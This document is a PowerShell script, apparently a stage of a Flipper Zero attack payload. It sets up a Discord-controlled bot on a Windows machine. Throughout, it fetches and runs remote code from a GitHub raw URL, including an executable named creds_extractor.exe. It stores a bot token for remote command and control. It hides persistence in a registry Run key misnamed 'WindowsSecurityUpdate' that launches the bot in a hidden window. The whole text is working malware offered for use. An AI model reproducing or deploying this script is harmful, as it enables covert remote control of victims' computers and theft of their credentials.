[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
$botToken = "$bt"
$channelId = "$ch"
$scriptDir = Join-Path $env:APPDATA "FlipperBot"
New-Item -ItemType Directory -Path $scriptDir -Force | Out-Null

$pythonPath = $null
foreach ($cmd in @("python", "py", "python3")) {
    $found = Get-Command $cmd -ErrorAction SilentlyContinue
    if ($found) { $pythonPath = $found.Source; break }
}

if (-not $pythonPath) {
    $pyDir = Join-Path $scriptDir "python"
    $pyZip = Join-Path $env:TEMP "python_embed.zip"
    $pyUrl = "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip"

    Invoke-WebRequest -Uri $pyUrl -OutFile $pyZip
    Expand-Archive -Path $pyZip -DestinationPath $pyDir -Force
    Remove-Item $pyZip -Force

    $pthFile = Join-Path $pyDir "python311._pth"
    (Get-Content $pthFile) -replace '#import site', 'import site' | Set-Content $pthFile

    $getPip = Join-Path $env:TEMP "get-pip.py"
    Invoke-WebRequest -Uri "https://bootstrap.pypa.io/get-pip.py" -OutFile $getPip
    $pythonPath = Join-Path $pyDir "python.exe"
    & $pythonPath $getPip --quiet
    Remove-Item $getPip -Force
} else {
    $pyDir = $null
}

& $pythonPath -m pip install discord.py Pillow psutil certifi --quiet 2>$null

$configPath = Join-Path $scriptDir "config.py"
$cfgLines = @()
$cfgLines += "BOT_TOKEN = `"$botToken`""
$cfgLines += "CHANNEL_ID = $channelId"
if ($pyDir) {
    $escaped = $pyDir.Replace('\','\\')
    $cfgLines += "PORTABLE_PYTHON = `"$escaped`""
} else {
    $cfgLines += "PORTABLE_PYTHON = None"
}
$cfgLines -join "`n" | Out-File -FilePath $configPath -Encoding ASCII

$botPath = Join-Path $scriptDir "bot.py"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ironpxs/flipper_scripts/main/flipperbot/f44b1874d8cce12b_bot.py" -OutFile $botPath

$exePath = Join-Path $scriptDir "creds_extractor.exe"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ironpxs/flipper_scripts/main/flipperbot/creds_extractor.exe" -OutFile $exePath

$launchCmd = "powershell -WindowStyle Hidden -Command `"& '$pythonPath' '$botPath'`""
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsSecurityUpdate' -Value $launchCmd

& $pythonPath $botPath
